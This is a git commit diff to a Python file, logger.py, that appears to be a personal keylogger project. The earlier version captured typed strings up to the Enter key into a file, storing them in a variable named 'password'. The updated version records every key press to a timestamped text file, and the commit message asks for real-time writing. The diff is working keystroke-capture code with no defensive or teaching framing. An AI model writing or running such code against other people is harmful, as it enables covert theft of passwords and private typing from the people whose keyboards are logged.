28f3dac30dc47db306825e8a81882022350c8972
TJordahl90 <jordahl902002@gmail.com>
2025-02-04 15:02:14 -0600

    Updated to create a new file based on date and time for logging. Need real time file writing

--- logger.py
+++ logger.py
@@ -1,15 +1,16 @@
 # Importing the keyboard module which will acess the inputs from the keyboard
 import keyboard
+from datetime import datetime
 
-# Defining the text file name and path
-path = "data.txt"
+# Get the current date and time for filename
+now = datetime.now()
+now = now.strftime("%d-%m-%Y %H-%M-%S")
 
-while True:
-    with open(path, 'a') as data_file:
-        
-        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
-        events = keyboard.record('enter')
-        password = list(keyboard.get_typed_strings(events))
-        
-        data_file.write('\n') # New line written before data is written
-        data_file.write(password[0])
+# Create path
+path = now + '.txt'
+
+with open(path, 'w') as file:
+    while True:
+        key = keyboard.read_event(suppress=False)
+        if(key.event_type == 'down'):
+            file.write(key.name)
